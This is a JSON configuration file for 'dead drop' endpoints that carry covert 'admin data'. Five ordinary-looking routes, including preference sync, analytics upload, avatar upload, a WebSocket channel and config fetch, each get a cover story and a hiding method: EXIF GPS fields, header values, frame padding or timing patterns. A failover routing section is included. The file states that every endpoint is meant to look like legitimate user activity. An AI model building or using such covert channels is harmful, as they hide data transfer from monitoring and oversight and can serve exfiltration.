{
  "_description": "Dead drop endpoints for covert admin data transmission",
  "_security_note": "Each endpoint appears as legitimate user action",
  "version": "1.0.0",
  "drops": [
    {
      "id": "sync_preferences",
      "path": "/api/v1/sync/preferences",
      "method": "POST",
      "cover": "User preference synchronization",
      "capacity_bytes": 2048,
      "encoding": "base64_in_json_field",
      "stego_field": "prefs_data",
      "fallback": true,
      "priority": 1
    },
    {
      "id": "analytics_batch",
      "path": "/api/v1/analytics/batch",
      "method": "POST", 
      "cover": "Anonymous analytics batch upload",
      "capacity_bytes": 4096,
      "encoding": "protobuf_in_body",
      "stego_layer": "timing_patterns",
      "fallback": true,
      "priority": 2
    },
    {
      "id": "upload_avatar",
      "path": "/api/v1/media/upload",
      "method": "POST",
      "cover": "User avatar/image upload",
      "capacity_bytes": 8192,
      "encoding": "exif_metadata",
      "stego_field": "gps_coordinates",
      "fallback": false,
      "priority": 3
    },
    {
      "id": "heartbeat_ws",
      "path": "/ws/updates",
      "method": "WebSocket",
      "cover": "Real-time notification channel",
      "capacity_bytes": 512,
      "encoding": "binary_frame_padding",
      "stego_field": "frame_padding",
      "fallback": true,
      "priority": 4
    },
    {
      "id": "config_fetch",
      "path": "/api/v1/config",
      "method": "GET",
      "cover": "App configuration fetch",
      "capacity_bytes": 1024,
      "encoding": "header_steganography",
      "stego_field": "x-request-id",
      "fallback": true,
      "priority": 5
    }
  ],
  "routing": {
    "mode": "round_robin_with_fallback",
    "health_check_interval_sec": 30,
    "failover_threshold": 2
  }
}
